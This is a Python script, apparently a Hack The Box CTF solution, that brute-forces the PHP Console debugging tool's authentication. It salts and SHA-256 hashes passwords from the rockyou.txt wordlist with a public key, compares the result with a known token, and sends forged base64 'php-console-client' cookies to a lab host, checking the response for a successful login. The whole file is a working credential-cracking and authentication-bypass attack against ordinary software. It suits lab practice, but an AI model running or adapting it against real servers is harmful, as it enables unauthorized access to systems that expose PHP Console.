import requests
from hashlib import sha256
from base64 import b64encode
import json

url = 'http://docker.hackthebox.eu:32642'

publicKey = 'd1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e'
f = open("./rockyou.txt",'r')
for i in range(10000):
    line = f.readline().strip()
    password = line+'NeverChangeIt:)'
    passwordHash = sha256(password.encode()).hexdigest()
    token = sha256((passwordHash+publicKey).encode()).hexdigest()
    if(token == 'ac6b9e41febb076e9d5f65053ac47b002a5b1e048361ba9f7179884558a17b76'):
        print(line)
        break
    phpConsole = '{"php-console-client":5,"auth":{"publicKey":"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e","token":"' + str(token) + '"}}'
    phpConsole = b64encode(phpConsole.encode()).decode()
    cookies = '_ga=GA1.2.17472251.1583007796; php-console-server=5; __auc=429a2481170e7388fa469b76c5b; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2201310fe9-3e7a-4117-b948-b1a9815f22d9%22; _gid=GA1.2.1163442380.1584583133; __asc=1b4604b2170f15eb493b0954def; php-console-client=' + str(phpConsole)
    headers = {
                'Cookie' : cookies,
                }
    r = requests.get(url, headers=headers)
    phpConsole = r.headers['PHP-Console']
    phpConsole = json.loads(phpConsole)
    status = phpConsole["auth"]["isSuccess"]
    if(status != False):
        print(line)
        break
f.close()